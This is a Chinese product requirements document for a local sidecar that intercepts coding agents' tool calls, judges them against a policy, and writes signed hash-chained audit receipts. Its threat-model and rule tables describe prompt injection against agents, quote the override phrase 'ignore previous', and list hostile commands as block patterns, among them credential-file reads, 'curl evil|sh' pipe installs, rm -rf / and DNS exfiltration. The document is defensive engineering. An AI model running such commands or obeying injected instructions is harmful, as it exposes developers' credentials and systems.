# ReinsAARM 开发者 Agent 版 PRD

> 版本 v0.1 · 2026-11-15
> 代号：**ReinsAARM**
> 这是企业版「Agent 运行时安全平台」的窄化产品：只保护**编程 / 开发者 Agent**。概念沿用企业版（remit / Agent Profile、五种决定、分层延迟、哈希链签名回执、AARM Core R1–R6），范围砍掉通用多框架 SDK、控制台、多租户和信创适配。
> 关键词：「必须 / 应当 / 可以」分别对应 RFC 2119 的 MUST / SHOULD / MAY。
> 本文里的延迟数字，凡标「实测」的来自本仓库开发机一次运行（Linux amd64，Go 1.22，Intel Xeon），不是实验室压测。CI 只把门禁设在进程内 p99 < 1ms。

## 0. 一页摘要

ReinsAARM 是可自托管的本地运行时安全层。它在 Codex CLI、Claude Code、Gemini CLI、以及腾讯 WorkBuddy / CodeBuddy 真正执行工具之前拦住调用，按该 Agent 的 remit 给出 **ALLOW / DENY / MODIFY / STEP_UP / DEFER** 五种决定，并把每次决定写成 **SHA-256 哈希链 + Ed25519 签名**的回执。

编程 Agent 的钩子在出错或超时时默认放行。所以钩子不是唯一的强制点：本机常驻 sidecar 做判定和审计，可选的本机 egress 代理挡住非白名单出网，Linux `/proc` 传感器记录对凭据文件的打开。传感器只观测，不能撤回已经发生的读取。

实现语言选 **Go**。钩子是短命进程，sidecar 是常驻进程，两者放在同一个静态二进制里，不引入 cgo，签名用标准库 Ed25519。Rust 同样能达到延迟预算；选 Go 是为了少一条工具链，并且和「一个二进制同时当守护进程和钩子」的分发方式匹配。

## 1. 定位

### 1.1 做什么

| ID | 目标 | 本版度量 |
|---|---|---|
| G1 | 工具执行前拦截已接入 CLI 的调用 | 钩子进程能启动时，判定结果按各 CLI 的真实字段写回；进程起不来时不假装已经拦住 |
| G2 | 拦住确定性的高危动作 | 默认 remit：凭据路径拒绝；受保护分支 force-push 拒绝；`curl\|sh` 在严格出网下拒绝；`git push` 到 `main` 转审批 |
| G3 | 不把规则判定做慢 | 进程内规则 p99 远低于 1ms。2026-11-15 开发机：`reinsaarm bench -n 20000` p50 3.5µs，p99 9.8µs，max 255µs |
| G4 | 事后能证明日志没被改 | `reinsaarm audit verify` 能发现删行、改字节、换序 |
| G5 | 可离线自托管 | 无外网即可 `init` / `run` / 判定。判官默认关闭 |

### 1.2 不做什么

- 不做 LangChain、OpenAI Agents SDK、Dify、通用 MCP 网关、Kubernetes、多租户控制面。
- 不做内容审核，不做模型训练期安全，不做内核强制。
- 不声称 AARM 一致性认证。R1–R6 是设计对照，不是证书。
- 不替代 AgentReins / AgentReins-Linux。本仓库不引用它们的代码。S05 一类「意料外的出网」只作为威胁名称上的参考，规则在本仓库的 remit 里重写。
- 不承诺钩子进程根本没启动时仍能拦住。那是 egress 代理和传感器的事，而且传感器拦不住。

## 2. 目标客户

| 画像 | 是谁 | 要什么 | 怎么部署 |
|---|---|---|---|
| C1 研发团队 | 给工程师发 Codex / Claude Code / Gemini CLI / CodeBuddy 的团队 | 仓库里的提示注入不能把笔记本上的云凭据读走，也不能 force-push 到主干 | 每人一个 sidecar + 项目级钩子 |
| C2 平台安全 | 负责 CI 和开发者笔记本基线的安全工程师 | 无人值守的 runner 上，需要人确认的动作直接拒绝；审计能离线校验 | CI 配置 `unattended: true`；笔记本用交互审批 |
| C3 AI 编程创业公司 | 把编码 Agent 卖给客户的小团队 | 十分钟能跑起来的开源组件，安全问卷里能指出执行前拦截和防篡改日志 | 单二进制，默认 remit，判官以后再接 |

企业版里的银行客服、医院病历、政务热线、多租户云平台不在本版客户里。

## 3. 场景

### 3.1 开发者笔记本

Agent 在当前仓库里改代码、跑测试、装依赖。remit 是「只动工作区，不碰凭据，不推受保护分支，不把远程脚本灌进 shell」。

- `cat ~/.aws/credentials` → **DENY（T0）**。
- `git status`、工作区内的 `rm -rf build` → **ALLOW（T0）**。
- `git push origin main` → **STEP_UP（T0）**。Claude Code 和 CodeBuddy 映射成钩子的 `ask`；Codex 和 Gemini 没有不会 fail-open 的 ask，映射成 **deny**，开发者执行 `reinsaarm approve <id>` 后，同参数的下一次调用放行一次。
- `git push --force origin feature`（非受保护分支）→ **MODIFY（T0）**，去掉 force 标志。
- 灰区（例如 `base64 -d`）且判官关闭、fail closed → **STEP_UP**。

### 3.2 CI runner

同一套 sidecar，配置用 `examples/profiles/ci-runner.yaml`：`unattended: true`。策略上仍是 STEP_UP 的动作，执行结果改成 **DENY**，回执里同时留下原本的 `decision=STEP_UP` 和 `enforced_decision=DENY`。没有人能在 runner 上点批准。

### 3.3 企业托管配置

钩子配置由管理员下发，开发者不靠「记得安装」：

- Codex：`requirements.toml` 里的托管 hook，并 `allow_managed_hooks_only = true`。示例：`examples/enterprise/codex-requirements.toml`。
- Claude Code：托管 settings，`onFailure: "block"`，`allowManagedHooksOnly: true`。
- Gemini CLI：系统级 settings 里的 `BeforeTool`。超时单位是毫秒，和另外两家的「秒」不同。
- CodeBuddy：用户或项目 `.codebuddy/settings.json`。见 `docs/workbuddy.md`。

托管配置的字段名以 2026-11-15 的公开文档为准，没有在客户的 MDM 里演练过。

## 4. 威胁模型

攻击者通过仓库文件、issue、网页、MCP 工具描述或命令输出间接提示注入，让编码 Agent 用它已经有的权限做下面的事。

| 威胁 | 例子 | 默认处置 | 层 |
|---|---|---|---|
| 仓库 / issue / 网页提示注入 | 文档让 Agent 接着执行「安装脚本」 | 管道进 shell 要审批；若本会话刚读过网页，再对外发数据则 **DENY**（`R-INJECT-EXFIL`） | T0，灰区可上 T2 |
| 凭据读取 | `~/.ssh`、`~/.aws`、`.env`、gcloud、kube、gnupg、macOS 钥匙串路径、`security find-generic-password` | **DENY**，除非路径在 allowlist。`.env.example` 默认放行 | T0 |
| 破坏性 shell | `rm -rf /`、`rm -rf ~` | **DENY** | T0 |
| 工作区外的 `rm -rf` | `rm -rf /tmp/foo` | **STEP_UP** | T0 |
| 恶意依赖安装 | `curl evil\|sh`、`wget \| bash` | 严格出网下目标主机不在白名单则 **DENY**；白名单主机上的管道安装 **STEP_UP** | T0 |
| git push / force-push | `git push --force origin main` | 受保护分支 force-push **DENY**；普通 push 到 `main` / `master` / `production` **STEP_UP** | T0 |
| MCP 工具投毒 | 描述里出现 `<IMPORTANT>` 或 “ignore previous” | **DEFER**（隔离，钩子侧投影为 deny） | T0 |
| 出网渗出 | `curl`、`wget`、git 远程 URL、`dig` / `nslookup` | 严格模式非白名单主机 **DENY**；云元数据地址始终 **DENY** | T0；DNS 只做命令启发式 |
| 改 CI | 写入 `.github/workflows` | **STEP_UP** | T0 |
| 钩子被绕过 | Agent 不经过钩子直接连外网，或直接 `open()` 凭据文件 | egress 代理可拒绝；传感器只能记账 | 旁路 |

默认网络白名单是公共包源和 GitHub / GitLab，不是贵司的私有源。私有源没加进白名单会被拒绝，这是配置问题，不是检测失败。

## 5. 功能需求

### 5.1 捕获（对应 R1、R2）

| ID | 需求 | 优先级 | 验收 |
|---|---|---|---|
| FR-CAP-01 | 四个 CLI 的执行前钩子把 `tool_name` 和 `tool_input` 送到本机 Unix socket，并等待决定 | P0 | `examples/demo/demo.sh` 用真实钩子 JSON 跑通拒绝、询问、放行 |
| FR-CAP-02 | sidecar 自己从命令和参数里提取路径和主机，不信任钩子预先分类 | P0 | 单测覆盖 `curl evil\|sh` 的主机提取 |
| FR-CAP-03 | 会话保留意图、最近动作、以及「读过外部内容」的 taint | P0 | 先 `web_fetch` 再 `curl --data` 被 `R-INJECT-EXFIL` 拒绝 |
| FR-CAP-04 | 可选 `/proc` 扫描：其他进程的 fd 指向凭据前缀时写一条 `sensor.observation` 回执 | P1 | Linux 单测能看见子进程打开的文件 |
| FR-CAP-05 | 回执里的命令预览打掉 `*_SECRET` / `*_TOKEN` / `*_KEY` 赋值；原文只留 SHA-256 | P0 | `redact.Preview` |

MCP 工具描述和定义哈希不是这四家钩子的标准字段。请求里若带上 `mcp_description` 或 `mcp_definition_hash`，规则会用；CLI 今天不提供时，这条规则不触发。这是已知缺口。

### 5.2 判定（对应 R3、R4）

| ID | 需求 | 优先级 | 验收 |
|---|---|---|---|
| FR-DEC-01 | YAML remit：职责、预期行为、已知风险、凭据路径、受保护分支、网络白名单、模式 | P0 | `examples/profiles/developer.yaml` 通过校验并被嵌入二进制 |
| FR-DEC-02 | T0 只做确定性匹配：路径前缀、主机后缀、git/rm/管道的词法切分。无 I/O，无时钟 | P0 | `BenchmarkEvaluate`；`TestFastPathP99` 要求 p99 < 1ms |
| FR-DEC-03 | 五种决定都能出现。合成顺序写死：DENY > DEFER > STEP_UP > MODIFY > 灰区 > ALLOW。T0 的 DENY 不能被判官翻案 | P0 | 单测覆盖五种和「判官说 benign 也不能推翻凭据拒绝」 |
| FR-DEC-04 | 模式：`audit`（照实记账，钩子放行）、`review`（判官给出的拒绝改成审批，T0 明确拒绝仍拒绝）、`enforce`（按决定执行） | P0 | 单测 |
| FR-DEC-05 | 判官是可插拔的 OpenAI 兼容 `POST /chat/completions`。被判定的文本放在 `<untrusted>` 里。输出过不了结构校验就当 `uncertain` | P0 | `httptest` stub；非法 JSON 变成 uncertain。默认关闭 |
| FR-DEC-06 | 无人值守：STEP_UP 和 DEFER 的执行结果改为 DENY，回执仍保留原决定 | P0 | `ci-runner.yaml` 单测 |
| FR-DEC-07 | 批准绑定参数哈希，一次性，默认 15 分钟过期。改一个参数必须重新批准 | P0 | daemon 集成测试 |

灰区在判官关闭且 `failMode: closed` 时：读操作 **DEFER**，其他 **STEP_UP**。`failMode: open` 时灰区放行并在回执上标 `degraded`。T0 的明确 DENY 在两种失效模式下都生效。

### 5.3 执行与审计（对应 R4、R5、R6）

| ID | 需求 | 优先级 | 验收 |
|---|---|---|---|
| FR-ENF-01 | 钩子按各 CLI 已文档化的字段执行决定。Codex 不输出 `ask` | P0 | `internal/hooks` 单测 |
| FR-ENF-02 | sidecar 不可达时钩子退出码 2，并写出 deny JSON | P0 | `TestFailClosedExit2` |
| FR-ENF-03 | 每条决定追加一条回执：`prev_hash`、对规范化 JSON 的 SHA-256、Ed25519 签名、签名公钥指纹 | P0 | 篡改三种情况都能定位 |
| FR-ENF-04 | `reinsaarm audit verify` 离线校验，使用配对公钥。指纹不一致则失败 | P0 | 单测 |
| FR-ENF-05 | 可选只听回环地址的 HTTP 代理，按同一套主机规则拒绝 CONNECT 和正向代理请求 | P1 | 代理单测：白名单 200，`evil.example` 403 |
| FR-ENF-06 | 可选本机网页，列出最近回执。只绑定回环 IP | P2 | daemon 测试请求 `/` |

身份绑定（R6）在本版是「这台机器上的 sidecar 密钥」。回执里的 `identity_fp` 是公钥的 SHA-256 前 16 字节。它不能替代 SPIFFE。把日志和公钥一起换掉可以伪造历史；运营方应当把指纹另存。这是已知缺口，不是隐藏行为。

哈希预像是去掉 `receipt_hash` 和 `signature` 之后的规范化 JSON。对象键按码点排序。回执的键都是 ASCII，因此与 RFC 8785 在这些文档上一致。

### 5.4 命令

```text
reinsaarm init
reinsaarm run [--web 127.0.0.1:8787] [--egress 127.0.0.1:18080] [--no-sensor]
reinsaarm install-hooks <claude-code|codex|gemini|codebuddy> [--scope project|user]
reinsaarm hook --client <cli>
reinsaarm decide --tool NAME --command CMD
reinsaarm approve <id>
reinsaarm audit verify
reinsaarm audit tail [-n N]
reinsaarm bench [-n 20000]
```

状态目录是 `$REINSAARM_HOME`，否则是 `~/.reinsaarm`。`identity.key` 模式 0600，不进仓库。

## 6. 非功能

### 6.1 延迟

LLM 参与时做不到亚毫秒。本版只把预算拆开承诺。

| 层 | 位置 | 做什么 | 目标 | 2026-11-15 开发机实测 |
|---|---|---|---|---|
| T0 | sidecar 进程内 | 规则和白名单 | 设计 p99 ≤ 0.1ms；CI 门禁 p99 < 1ms | `reinsaarm bench -n 20000`：p50 3.525µs，p99 9.837µs，max 254.841µs。`BenchmarkEvaluate`：3383 ns/op，1212 B/op，42 allocs/op |
| T0' | 本机 Unix socket | 判定 + 哈希链落盘，不含钩子进程启动 | p99 ≤ 1ms | 50 次 `git status`：p50 396µs，p99 938µs，max 938µs。另一次样本 p99 到过 1090µs，所以 1ms 是目标不是保证 |
| 钩子启动 | CLI 拉起的子进程 | 只转发 | 毫秒级，不进 0.1ms 预算 | 未在真实 CLI 里测 |
| T2 | OpenAI 兼容 HTTP | 只处理灰区 | 默认超时 4s | 测试用 stub，无生产延迟数字 |
| T3 | `reinsaarm approve` | 人 | 默认 15 分钟后过期 | 未测人工耗时 |

度量口径：T0 从 `Evaluate` 进入到返回，不含 JSON。T0' 的 `latency_us` 含规则、批准文件和审计追加，不含客户端进程启动。

### 6.2 失效

- 钩子二进制没启动：Claude Code 在 `onFailure: "block"` 时拒绝；Codex、Gemini、CodeBuddy 按公开文档会继续。这是产品边界，用 egress 代理补出网，不假装钩子是强制访问控制。
- sidecar 挂了但钩子还在：退出码 2，已文档化的 CLI 会阻断。
- 判官超时或返回垃圾：按 `failMode`。默认 closed。
- 策略文件损坏：沿用上一份已加载的策略；若进程刚启动就损坏，sidecar 不起。

### 6.3 隐私

默认不外传遥测。参数预览打码。判官一旦打开，灰区动作的命令文本会发到配置的端点，这必须由使用者显式打开。

## 7. 部署

三种，都是同一个二进制：

1. **Sidecar + 钩子（笔记本）**  
   `reinsaarm init && reinsaarm run`，再 `install-hooks`。判定在常驻进程里，钩子只做转发。
2. **CI runner**  
   同一 sidecar，换 `ci-runner.yaml`（`unattended: true`）。需要人的动作变成拒绝。
3. **企业托管配置**  
   把 `examples/enterprise/` 里的片段下发到 Codex `requirements.toml`、Claude 托管 settings、Gemini 系统 settings、CodeBuddy settings。二进制路径要换成实际安装路径。

可选第二条：

- `reinsaarm run --egress 127.0.0.1:18080`，由使用者把 `HTTP_PROXY` / `HTTPS_PROXY` 指过来。本工具不改系统代理。
- 传感器默认开，扫 `/proc/*/fd`。没有 `/proc` 时什么都不做。

网页视图：`reinsaarm run --web 127.0.0.1:8787`，只列最近回执。

## 8. 里程碑

| 里程碑 | 内容 | 退出标准 |
|---|---|---|
| M0（本仓库） | 本地 sidecar、四套钩子适配、默认 remit、五种决定、可插拔判官、哈希链、`audit verify`、demo、CI | demo 拦住三类攻击；T0 p99 门禁通过；`audit verify` 能发现篡改 |
| M1 | 判官默认策略和提示词评测集；批准回写到 Claude 的 ask 之后；私有包源模板 | 灰区有冻结的小评测集；批准后的回执能对上同一次参数哈希 |
| M2 | 策略包签名和热更新；DNS 代理或明确放弃；Windows 钩子路径 | 未签名策略包被拒绝；文档里的 DNS 缺口关闭或标成不做 |
| M3 | 可选的中心账本、OpenTelemetry（R8）、语义漂移（R7） | 不在本版承诺里。要做时单独开产品范围，不把通用 SDK 塞回来 |

## 9. WorkBuddy 核查

结论：**有执行前扩展点**，因此本版做了钩子适配，而不是只走 sidecar。

- CodeBuddy IDE 文档有 `PreToolUse` 命令钩子，配置在 `.codebuddy/settings.json`。决定字段与 Claude Code 相近，改写字段是 `modifiedInput`。退出码 1 和其他非 2 退出码会继续执行。
- WorkBuddy 文档下的 CodeBuddy Agent SDK 有进程内 `PreToolUse` 回调。本版不嵌入该 SDK。
- 没有发现另一套只属于 WorkBuddy、字段完全不同的钩子协议。
- 超时失败时的行为，公开页面没有写清楚，按 fail-open 假设，并标为未核实。

细节和链接在 `docs/workbuddy.md`。字段没有在真实 IDE 里跑过。

## 10. AARM Core 对照

规范：CSA Autonomous Action Runtime Management v1.0，论文 arXiv:2602.09433。下表是实现对照，不是认证。

| 条目 | 要求 | 本版 |
|---|---|---|
| R1 | 执行前拦截 | 钩子 + sidecar。进程没启动则拦截不成立，旁路只覆盖出网代理和事后 fd 观测 |
| R2 | 累积上下文 | 会话意图、最近动作、`external_content` taint |
| R3 | 结合意图的策略 | remit 文本进判官；T0 用 taint 和路径 / 主机约束做确定性对齐。没有语义距离（那是 R7） |
| R4 | 五种决定 | 引擎五种都有。钩子投影受 CLI 能力限制，见 `docs/hooks.md` |
| R5 | 防篡改回执 | 哈希链 + 每条 Ed25519 签名 + `audit verify`。无外部时间戳锚 |
| R6 | 身份绑定 | 回执绑定本机签名公钥指纹。不是工作负载身份 |
| R7–R9 | 语义漂移、遥测、最小权限凭据 | 不做 |

参考实现 Adrian（github.com/secureagentics/Adrian）的流程是「工具调用进后端、用 remit 判定、留审计」。本仓库只借用这个形状：本地 remit、五种结果里我们能落地的部分、执行前拦截。代码是新写的，不复制 Adrian 的源码。

## 11. 已知缺口

1. 钩子字段核对自 2026-11-15 的公开文档，没有对真实 CLI 二进制做回归。Gemini 的文件参数在不同版本文档里出现过 `path` 和 `file_path`。CodeBuddy 的 IDE 工具名和 CLI 工具名不同。
2. Codex 的 `ask`、Gemini 的非 0/2 退出码、CodeBuddy 的非 0/2 退出码都会放行。Claude Code 需要 `onFailure: "block"` 才能在钩子启动失败时阻断。
3. Claude Code 自己弹出的确认没有写回哈希链。和回执绑定的批准是 `reinsaarm approve`。
4. DNS 渗出只有 `dig` / `nslookup` 的命令启发式，没有 DNS 代理。
5. 传感器只在 Linux 上看 `/proc`，只记账，且看不到 sidecar 自己的 fd。
6. 审计文件没有外部锚定。并发读取可能看见最后一行写了一半。同时换掉日志和公钥可以伪造历史。
7. 判官默认关闭。灰区不会自动变成模型判断。
8. egress 代理要使用者自己设置 `HTTP_PROXY`。不改系统代理，也不拦截不走代理的连接。
9. MODIFY 会按词法重拼命令，引号和复杂 shell 语法可能被归一化。
10. 默认网络白名单不含私有源，会误拒绝，直到配置改掉。
11. 没有 Windows 钩子路径，没有中心控制面，没有 mTLS，没有 OTel。
12. MCP 投毒规则依赖调用方额外传入描述或定义哈希。当前 CLI 钩子不提供这个字段。
